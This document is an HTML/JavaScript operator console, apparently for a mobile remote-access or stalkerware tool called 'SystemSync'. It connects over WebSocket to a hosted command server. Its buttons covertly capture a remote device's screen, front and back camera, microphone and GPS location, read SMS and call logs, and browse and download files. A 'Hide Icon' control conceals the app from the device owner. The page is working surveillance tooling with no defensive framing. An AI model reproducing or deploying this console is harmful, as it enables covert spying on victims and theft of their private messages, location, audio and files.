<!DOCTYPE html>
<html>
<head>
<title>SystemSync Elite Console</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
<style>
body{
    margin:0;
    background:#f4f6fb;
    font-family:Segoe UI;
    display:flex;
    height:100vh;
    overflow:hidden;
}
#sidebar{
    width:270px;
    background:#ffffff;
    border-right:1px solid #e2e6ef;
    padding:18px;
    overflow-y:auto;
    flex-shrink:0;
}
.logo{
    font-size:20px;
    font-weight:700;
    color:#1976ff;
    margin-bottom:20px;
}
.section-title{
    font-size:11px;
    color:#8892a7;
    margin:18px 0 6px;
    text-transform:uppercase;
}
button{
    width:100%;
    padding:10px;
    border-radius:8px;
    border:1px solid #dfe3ec;
    background:#fff;
    cursor:pointer;
    margin-bottom:6px;
    text-align:left;
    transition:.2s;
}
button:hover{
    background:#1976ff;
    color:#fff;
}
#main{
    flex:1;
    display:flex;
    flex-direction:column;
    min-width:0;
}
#header{
    height:60px;
    background:#fff;
    border-bottom:1px solid #e2e6ef;
    display:flex;
    align-items:center;
    justify-content:space-between;
    padding:0 25px;
    font-weight:600;
}
#status{
    padding:6px 12px;
    border-radius:20px;
    background:#ffebee;
    color:#d32f2f;
}
#panel{
    flex:1;
    margin:20px;
    background:#fff;
    border-radius:14px;
    box-shadow:0 8px 25px rgba(0,0,0,.05);
    overflow:auto;
    padding:20px;
}
#map{
    height:400px;
    width:100%;
    border-radius:8px;
}
table{
    width:100%;
    border-collapse:collapse;
    table-layout:fixed;
}
th,td{
    padding:10px;
    border-bottom:1px solid #eef1f6;
    font-size:14px;
    word-wrap:break-word;
    overflow-wrap:break-word;
}
th{
    background:#f7f9fc;
    text-align:left;
}
.file{
    padding:10px;
    border-bottom:1px solid #eef1f6;
    cursor:pointer;
}
.file:hover{
    background:#f1f5ff;
}
.pagination{
    margin-top:10px;
    display:flex;
    gap:6px;
    flex-wrap:wrap;
}
.pageBtn{
    padding:6px 10px;
    border:1px solid #d0d7e2;
    background:#fff;
    cursor:pointer;
}
.pageBtn:hover{
    background:#1976ff;
    color:#fff;
}
video,img{
    max-width:100%;
    max-height:70vh;
    object-fit:contain;
}
</style>
</head>
<body>

<div id="sidebar">
<div class="logo">SystemSync</div>

<div class="section-title">Surveillance</div>

<!-- Toggle buttons -->
<button id="screenToggle" onclick="toggleScreen()">üñ• Start Screen</button>
<button id="frontCamToggle" onclick="toggleFrontCam()">üì∑ Start Front Camera</button>
<button id="backCamToggle" onclick="toggleBackCam()">üì∑ Start Back Camera</button>
<button id="micToggle" onclick="toggleMic()">üé§ Start Mic</button>

<button onclick="sendJSON('getLocation', {})">üìç GPS</button>
<button id="iconToggle" onclick="toggleAppIcon()">üëª Hide Icon</button>

<div class="section-title">Data</div>

<button onclick="sendJSON('listFiles', { path: 'root' })">üìÇ File Manager</button>
<button onclick="sendJSON('getSMS', { box: 'inbox' })">üí¨ SMS Logs</button>
<button onclick="sendJSON('getCallLogs', {})">üìû Call Logs</button>

</div>

<div id="main">
<div id="header">
Elite Control Panel
<div id="status">CONNECTING</div>
</div>
<div id="panel">
Ready.
</div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
// ================== CONFIG ==================
const WS_URL = "wss://mirror-view.onrender.com"; // Change if needed

// ================== GLOBALS ==================
let ws;
let pc; // for screen sharing
let currentData = [];
let currentPage = 0;
let dataType = null; // 'sms', 'call', 'file', 'location'
let mapInstance = null;

// Toggle states
let screenActive = false;
let frontCamActive = false;
let backCamActive = false;
let micActive = false;
let iconHidden = false; // actual state will be updated by responses

const panel = document.getElementById("panel");
const statusDiv = document.getElementById("status");

// ================== CONNECTION ==================
function connect() {
    ws = new WebSocket(WS_URL);
    ws.onopen = () => {
        console.log("WebSocket open");
        ws.send("I_AM_WEB");
        setStatus("ONLINE");
    };
    ws.onclose = () => {
        console.log("WebSocket closed");
        setStatus("OFFLINE");
        setTimeout(connect, 4000);
    };
    ws.onerror = (err) => {
        console.error("WebSocket error", err);
    };
    ws.onmessage = (e) => {
        const msg = e.data;
        console.log("Received:", msg);

        if (msg.startsWith("STATUS:")) {
            setStatus(msg.substring(7));
        } else if (msg.startsWith("SMS_DATA:")) {
            dataType = 'sms';
            currentData = JSON.parse(msg.substring(9));
            renderTable();
        } else if (msg.startsWith("CALL_DATA:")) {
            dataType = 'call';
            currentData = JSON.parse(msg.substring(10));
            renderTable();
        } else if (msg.startsWith("FILE_LIST:")) {
            dataType = 'file';
            currentData = JSON.parse(msg.substring(10));
            renderFiles();
        } else if (msg.startsWith("LOC_DATA:")) {
            dataType = 'location';
            const loc = JSON.parse(msg.substring(9));
            renderMap(loc);
        } else if (msg.startsWith("CAMERA_IMAGE:")) {
            showImage(msg.substring(13));
        } else if (msg.startsWith("RTC_OFFER:screen:")) {
            handleOffer(msg.substring(17));
        } else if (msg.startsWith("ERROR:")) {
            panel.innerHTML = `<div style="color:red">Error: ${msg.substring(6)}</div>`;
        } else if (msg.startsWith("APP_HIDDEN")) {
            iconHidden = true;
            document.getElementById("iconToggle").innerHTML = "üëÄ Show Icon";
        } else if (msg.startsWith("APP_SHOWN")) {
            iconHidden = false;
            document.getElementById("iconToggle").innerHTML = "üëª Hide Icon";
        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
            // nothing needed
        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
            if (pc) { pc.close(); pc = null; }
        } else if (msg.startsWith("AUDIO_RECORDING_STARTED")) {
            micActive = true;
            document.getElementById("micToggle").innerHTML = "‚èπ Stop Mic";
        } else if (msg.startsWith("AUDIO_RECORDING_STOPPED")) {
            micActive = false;
            document.getElementById("micToggle").innerHTML = "üé§ Start Mic";
        }
    };
}

function setStatus(s) {
    statusDiv.innerText = s;
    statusDiv.style.background = s === "ONLINE" ? "#e8f5e9" : "#ffebee";
}

// ================== SEND JSON COMMAND ==================
function sendJSON(command, params = {}) {
    if (!ws || ws.readyState !== WebSocket.OPEN) {
        alert("Not connected to server");
        return;
    }
    const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
    const payload = {
        type: 'COMMAND',
        command: command,
        requestId: requestId,
        params: params,
        timestamp: Date.now()
    };
    ws.send(JSON.stringify(payload));
    console.log("Sent:", payload);
}

// ================== TOGGLE BUTTONS ==================
function toggleScreen() {
    if (screenActive) {
        sendJSON('STOP_SCREEN_SHARE');
        document.getElementById("screenToggle").innerHTML = "üñ• Start Screen";
    } else {
        panel.innerHTML = "<h2>Waiting for screen...</h2>";
        sendJSON('START_SCREEN_SHARE');
        document.getElementById("screenToggle").innerHTML = "‚èπ Stop Screen";
    }
    screenActive = !screenActive;
}

function toggleFrontCam() {
    if (frontCamActive) {
        // Camera sends one image then stops, so just revert button
        document.getElementById("frontCamToggle").innerHTML = "üì∑ Start Front Camera";
    } else {
        sendJSON('cameraSnapshot', { camera: 'front' });
        document.getElementById("frontCamToggle").innerHTML = "‚èπ Stop Front Camera";
    }
    frontCamActive = !frontCamActive;
    if (frontCamActive) {
        // Auto-revert after 5 seconds (camera stops after one shot)
        setTimeout(() => {
            if (frontCamActive) {
                frontCamActive = false;
                document.getElementById("frontCamToggle").innerHTML = "üì∑ Start Front Camera";
            }
        }, 5000);
    }
}

function toggleBackCam() {
    if (backCamActive) {
        document.getElementById("backCamToggle").innerHTML = "üì∑ Start Back Camera";
    } else {
        sendJSON('cameraSnapshot', { camera: 'back' });
        document.getElementById("backCamToggle").innerHTML = "‚èπ Stop Back Camera";
    }
    backCamActive = !backCamActive;
    if (backCamActive) {
        setTimeout(() => {
            if (backCamActive) {
                backCamActive = false;
                document.getElementById("backCamToggle").innerHTML = "üì∑ Start Back Camera";
            }
        }, 5000);
    }
}

function toggleMic() {
    if (micActive) {
        sendJSON('STOP_AUDIO_RECORDING');
        // Button text will be updated by the response
    } else {
        sendJSON('START_AUDIO_RECORDING');
        // Button text will be updated by the response
    }
    // We don't toggle immediately; wait for response
}

function toggleAppIcon() {
    if (iconHidden) {
        sendJSON('showApp');
        // Button text updates on response
    } else {
        sendJSON('hideApp');
        // Button text updates on response
    }
}

// ================== PANEL RENDERERS ==================
function showImage(base64) {
    panel.innerHTML = `<img src="data:image/jpeg;base64,${base64}">`;
    frontCamActive = false;
    backCamActive = false;
    document.getElementById("frontCamToggle").innerHTML = "üì∑ Start Front Camera";
    document.getElementById("backCamToggle").innerHTML = "üì∑ Start Back Camera";
}

function renderMap(loc) {
    panel.innerHTML = '<div id="map"></div>';
    if (mapInstance) mapInstance.remove();
    mapInstance = L.map('map').setView([loc.lat, loc.lon], 18);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
    L.circle([loc.lat, loc.lon], { radius: loc.accuracy, color: '#1976ff' }).addTo(mapInstance);
}

function renderTable() {
    if (!currentData || currentData.length === 0) {
        panel.innerHTML = "<p>No data</p>";
        return;
    }

    let filteredData;
    if (dataType === 'sms') {
        filteredData = currentData.map(item => ({
            Type: item.type,
            Number: item.number,
            Message: item.body,
            Date: item.date
        }));
    } else if (dataType === 'call') {
        filteredData = currentData.map(item => ({
            Type: item.type,
            Number: item.number,
            Name: item.name || '',
            Date: item.date,
            Duration: item.durationFormatted || item.duration + 's'
        }));
    } else {
        filteredData = currentData; // fallback
    }

    const start = currentPage * 20;
    const rows = filteredData.slice(start, start + 20);
    if (rows.length === 0) {
        panel.innerHTML = "<p>No data on this page</p>";
        return;
    }

    let html = `<table><tr>`;
    Object.keys(rows[0]).forEach(k => {
        html += `<th>${k}</th>`;
    });
    html += "</tr>";

    rows.forEach(r => {
        html += "<tr>";
        Object.values(r).forEach(v => {
            html += `<td>${v}</td>`;
        });
        html += "</tr>";
    });
    html += "</table>";

    const totalPages = Math.ceil(filteredData.length / 20);
    if (totalPages > 1) {
        html += `<div class="pagination">`;
        for (let i = 0; i < totalPages; i++) {
            html += `<button class="pageBtn" onclick="gotoPage(${i})">${i+1}</button>`;
        }
        html += `</div>`;
    }

    panel.innerHTML = html;
}

function gotoPage(p) {
    currentPage = p;
    renderTable();
}

function renderFiles() {
    if (!currentData || currentData.length === 0) {
        panel.innerHTML = "<p>No files found</p>";
        return;
    }
    let html = "<h3>File Explorer</h3>";
    currentData.forEach(f => {
        // Use a data attribute to store path and call a function with proper escaping
        html += `<div class="file" data-path="${f.path}" data-isdir="${f.isDir}" onclick="handleFileClick(this)">${f.isDir ? 'üìÅ' : 'üìÑ'} ${f.name}</div>`;
    });
    panel.innerHTML = html;
}

// Helper for file clicks
window.handleFileClick = function(element) {
    const path = element.dataset.path;
    const isDir = element.dataset.isdir === 'true';
    if (isDir) {
        sendJSON('listFiles', { path: path });
    } else {
        sendJSON('downloadFile', { path: path });
    }
};

// ================== WEBRTC ==================
function handleOffer(sdp) {
    if (!pc) {
        pc = new RTCPeerConnection({
            iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
        });
        pc.ontrack = (e) => {
            panel.innerHTML = '<video autoplay playsinline id="v"></video>';
            document.getElementById("v").srcObject = e.streams[0];
        };
        pc.onicecandidate = (e) => {
            if (e.candidate) {
                sendJSON('iceCandidate', {
                    candidate: e.candidate.candidate,
                    sdpMid: e.candidate.sdpMid,
                    sdpMLineIndex: e.candidate.sdpMLineIndex
                });
            }
        };
    }
    pc.setRemoteDescription({ type: 'offer', sdp: sdp })
        .then(() => pc.createAnswer())
        .then(a => pc.setLocalDescription(a))
        .then(() => {
            sendJSON('answer', { sdp: pc.localDescription.sdp });
        })
        .catch(e => console.error("WebRTC error", e));
}

// ================== START ==================
connect();
</script>
</body>
</html>
